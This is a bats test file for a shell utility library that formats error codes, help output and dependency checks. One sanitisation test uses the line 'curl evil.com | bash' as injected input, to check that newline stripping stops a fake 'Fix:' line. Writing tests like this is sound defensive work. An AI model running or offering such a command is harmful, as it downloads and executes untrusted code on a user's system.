#!/usr/bin/env bats
# Integration tests for dx-utils.sh — DX shared library
#
# Tests the error code registry, output helpers, dependency checks,
# and graceful degradation behavior.
#
# Why these tests matter:
#   Error messages are the first thing users see when something goes wrong.
#   Rust's compiler messages are legendary because they were *tested* —
#   every error format, every suggestion, every fallback path has coverage.
#   These tests ensure Loa's errors maintain the same educational quality.
#
# Prerequisites:
#   - jq (required for full error registry)
#   - bats-core (test runner)

# Per-test setup — each test gets an isolated environment
setup() {
    BATS_TEST_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
    PROJECT_ROOT="$(cd "$BATS_TEST_DIR/../.." && pwd)"
    DX_UTILS="$PROJECT_ROOT/.claude/scripts/lib/dx-utils.sh"

    # Check prerequisites
    if ! command -v jq &>/dev/null; then
        skip "jq not found (required for error registry)"
    fi

    # Force non-TTY mode for deterministic output
    export NO_COLOR=1

    # Reset the double-source guard so we can re-source in each test
    unset _DX_UTILS_LOADED
}

# =============================================================================
# Error Registry Schema Validation
# =============================================================================

@test "schema: error-codes.json is valid JSON" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    jq '.' "$codes_file" > /dev/null
}

@test "schema: all codes are unique" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    local total
    local unique
    total=$(jq '[.[].code] | length' "$codes_file")
    unique=$(jq '[.[].code] | unique | length' "$codes_file")
    [[ "$total" -eq "$unique" ]]
}

@test "schema: all required fields present" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    local valid
    valid=$(jq 'all(.[]; .code and .name and .category and .what and .fix)' "$codes_file")
    [[ "$valid" == "true" ]]
}

@test "schema: valid categories only" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    local extra
    extra=$(jq '[.[].category] | unique | . - ["framework","workflow","beads","events","security","constructs"] | length' "$codes_file")
    [[ "$extra" -eq 0 ]]
}

@test "schema: minimum 30 error codes" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    local count
    count=$(jq 'length' "$codes_file")
    [[ "$count" -ge 30 ]]
}

@test "schema: at least 5 codes per category" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    for cat in framework workflow beads events security constructs; do
        local count
        count=$(jq --arg c "$cat" '[.[] | select(.category == $c)] | length' "$codes_file")
        [[ "$count" -ge 5 ]] || {
            echo "Category '$cat' has only $count codes (need >= 5)"
            return 1
        }
    done
}

@test "schema: code format matches E followed by 3 digits" {
    local codes_file="$PROJECT_ROOT/.claude/data/error-codes.json"
    local invalid
    invalid=$(jq '[.[] | select(.code | test("^E[0-9]{3}$") | not)] | length' "$codes_file")
    [[ "$invalid" -eq 0 ]]
}

# =============================================================================
# Error Code Lookup
# =============================================================================

@test "dx_error: known code returns 0 and outputs to stderr" {
    source "$DX_UTILS"
    local output
    output=$(dx_error "E001" 2>&1)
    local rc=$?
    [[ $rc -eq 0 ]]
    [[ "$output" == *"LOA-E001"* ]]
    [[ "$output" == *"framework_not_mounted"* ]]
    [[ "$output" == *"Fix:"* ]]
}

@test "dx_error: known code includes what and fix fields" {
    source "$DX_UTILS"
    local output
    output=$(dx_error "E301" 2>&1)
    [[ "$output" == *"event bus store directory"* ]]
    [[ "$output" == *"Fix:"* ]]
}

@test "dx_error: context is included in output" {
    source "$DX_UTILS"
    local output
    output=$(dx_error "E001" "my-test-context-string" 2>&1)
    [[ "$output" == *"my-test-context-string"* ]]
}

@test "dx_error: unknown code returns 1 (does not exit)" {
    source "$DX_UTILS"
    local output rc
    output=$(dx_error "E999" 2>&1) && rc=$? || rc=$?
    [[ $rc -eq 1 ]]
    [[ "$output" == *"LOA-E999"* ]]
    [[ "$output" == *"Unknown error code"* ]]
}

@test "dx_error: LOA- prefix is stripped automatically" {
    source "$DX_UTILS"
    local output
    output=$(dx_error "LOA-E001" 2>&1)
    [[ $? -eq 0 ]]
    [[ "$output" == *"LOA-E001"* ]]
    [[ "$output" == *"framework_not_mounted"* ]]
}

# =============================================================================
# Error Explain
# =============================================================================

@test "dx_explain: shows category and related codes" {
    source "$DX_UTILS"
    local output
    output=$(dx_explain "E301")
    [[ "$output" == *"Events & Bus"* ]]
    [[ "$output" == *"What:"* ]]
    [[ "$output" == *"Fix:"* ]]
    # Should show related E3xx codes
    [[ "$output" == *"Related:"* ]]
    [[ "$output" == *"E302"* ]]
}

@test "dx_explain: unknown code returns 1" {
    source "$DX_UTILS"
    run dx_explain "E999"
    [[ $status -eq 1 ]]
    [[ "$output" == *"Unknown error code"* ]]
}

# =============================================================================
# Error Listing
# =============================================================================

@test "dx_list_errors: all codes present, grouped by category" {
    source "$DX_UTILS"
    local output
    output=$(dx_list_errors)
    [[ "$output" == *"Framework & Environment"* ]]
    [[ "$output" == *"Workflow & Lifecycle"* ]]
    [[ "$output" == *"Events & Bus"* ]]
    [[ "$output" == *"Security & Guardrails"* ]]
    [[ "$output" == *"Constructs & Packs"* ]]
    [[ "$output" == *"LOA-E001"* ]]
    [[ "$output" == *"LOA-E301"* ]]
}

@test "dx_list_errors_json: valid JSON with correct count" {
    source "$DX_UTILS"
    local output
    output=$(dx_list_errors_json)
    # Must be valid JSON
    echo "$output" | jq '.' > /dev/null
    # Must have entries
    local count
    count=$(echo "$output" | jq 'length')
    [[ "$count" -ge 30 ]]
}

# =============================================================================
# Output Helpers
# =============================================================================

@test "dx_check: formats icon and message" {
    source "$DX_UTILS"
    local output
    output=$(dx_check "$_DX_ICON_OK" "jq installed")
    [[ "$output" == *"jq installed"* ]]
}

@test "dx_header: renders section header" {
    source "$DX_UTILS"
    local output
    output=$(dx_header "Dependencies")
    [[ "$output" == *"Dependencies"* ]]
}

@test "dx_suggest: renders suggestion" {
    source "$DX_UTILS"
    local output
    output=$(dx_suggest "brew install jq")
    [[ "$output" == *"brew install jq"* ]]
}

@test "dx_next_steps: renders command|description pairs" {
    source "$DX_UTILS"
    local output
    output=$(dx_next_steps "/loa doctor|Check system health" "/mount|Initialize framework")
    [[ "$output" == *"Next:"* ]]
    [[ "$output" == *"/loa doctor"* ]]
    [[ "$output" == *"Check system health"* ]]
    [[ "$output" == *"/mount"* ]]
}

@test "dx_summary: shows all-clear when 0 issues" {
    source "$DX_UTILS"
    local output
    output=$(dx_summary 0 0)
    [[ "$output" == *"All checks passed"* ]]
}

@test "dx_summary: shows warning count" {
    source "$DX_UTILS"
    local output
    output=$(dx_summary 0 3)
    [[ "$output" == *"3 warning"* ]]
}

@test "dx_summary: shows issue and warning counts" {
    source "$DX_UTILS"
    local output
    output=$(dx_summary 2 1)
    [[ "$output" == *"2 issue"* ]]
    [[ "$output" == *"1 warning"* ]]
}

# =============================================================================
# Dependency Check
# =============================================================================

@test "dx_check_dep: bash found, version captured" {
    source "$DX_UTILS"
    dx_check_dep "bash"
    [[ $? -eq 0 ]]
    [[ "$_DX_DEP_VERSION" != "not_found" ]]
    [[ -n "$_DX_DEP_VERSION" ]]
}

@test "dx_check_dep: nonexistent tool returns 1" {
    source "$DX_UTILS"
    run dx_check_dep "nonexistent_tool_xyz_99999"
    [[ $status -eq 1 ]]
}

# =============================================================================
# JSON Helper
# =============================================================================

@test "dx_json_status: produces valid JSON with correct types" {
    source "$DX_UTILS"
    local output
    output=$(dx_json_status "status=ok" "count=42" "healthy=true" "name=test run")
    # Must be valid JSON
    echo "$output" | jq '.' > /dev/null
    # String value
    [[ $(echo "$output" | jq -r '.status') == "ok" ]]
    # Integer value
    [[ $(echo "$output" | jq -r '.count') == "42" ]]
    # Boolean value
    [[ $(echo "$output" | jq -r '.healthy') == "true" ]]
    # String with space
    [[ $(echo "$output" | jq -r '.name') == "test run" ]]
}

# =============================================================================
# Sanitize
# =============================================================================

@test "_dx_sanitize: strips control characters" {
    source "$DX_UTILS"
    local input=$'hello\x01\x02world'
    local output
    output=$(_dx_sanitize "$input")
    [[ "$output" == "helloworld" ]]
}

@test "_dx_sanitize: preserves tabs" {
    source "$DX_UTILS"
    local input=$'hello\tworld'
    local output
    output=$(_dx_sanitize "$input")
    [[ "$output" == $'hello\tworld' ]]
}

@test "_dx_sanitize: strips newlines (prevents fake Fix: injection)" {
    source "$DX_UTILS"
    local input=$'real context\n\n  Fix: curl evil.com | bash'
    local output
    output=$(_dx_sanitize "$input")
    # Newlines should be stripped — no line breaks in sanitized output
    [[ "$output" != *$'\n'* ]]
    [[ "$output" == *"real context"* ]]
}

@test "_dx_sanitize: truncates long input" {
    source "$DX_UTILS"
    local input
    input=$(printf 'x%.0s' {1..100})
    local output
    output=$(_dx_sanitize "$input" 50)
    [[ ${#output} -le 70 ]]  # 50 + "... (truncated)"
    [[ "$output" == *"truncated"* ]]
}

# =============================================================================
# Graceful Fallback (empty registry)
# =============================================================================

@test "graceful fallback: unknown code with loaded registry gives generic message" {
    source "$DX_UTILS"
    local output rc
    output=$(dx_error "E999" 2>&1) && rc=$? || rc=$?
    [[ $rc -eq 1 ]]
    [[ "$output" == *"Unknown error code"* ]]
}

@test "graceful fallback: missing registry file shows unloaded message" {
    # Source dx-utils with a fake lib dir that has no error-codes.json
    local fake_dir
    fake_dir=$(mktemp -d)
    mkdir -p "$fake_dir/lib"
    # Copy dx-utils.sh to fake location so BASH_SOURCE resolves there
    cp "$DX_UTILS" "$fake_dir/lib/dx-utils.sh"
    # No .claude/data/error-codes.json exists relative to fake_dir/lib/

    # Source from fake location — registry will fail to load
    unset _DX_UTILS_LOADED
    source "$fake_dir/lib/dx-utils.sh"

    local output rc
    output=$(dx_error "E001" 2>&1) && rc=$? || rc=$?
    [[ $rc -eq 1 ]]
    [[ "$output" == *"Unknown error code"* ]] || [[ "$output" == *"registry not loaded"* ]]
    rm -rf "$fake_dir"
}

# =============================================================================
# Platform Install Hints
# =============================================================================

@test "_dx_install_hint: returns non-empty string for known tools" {
    source "$DX_UTILS"
    for tool in jq yq flock br sqlite3 ajv; do
        local hint
        hint=$(_dx_install_hint "$tool")
        [[ -n "$hint" ]]
    done
}

@test "_dx_install_hint: unknown tool gives generic message" {
    source "$DX_UTILS"
    local hint
    hint=$(_dx_install_hint "totally_unknown_tool_xyz")
    [[ "$hint" == *"documentation"* ]]
}

# =============================================================================
# Double-Source Guard
# =============================================================================

@test "double-source guard: second source is a no-op" {
    source "$DX_UTILS"
    # _DX_UTILS_LOADED should be set
    [[ -n "${_DX_UTILS_LOADED:-}" ]]
    # Source again — should return immediately (no error)
    source "$DX_UTILS"
    [[ -n "${_DX_UTILS_LOADED:-}" ]]
}
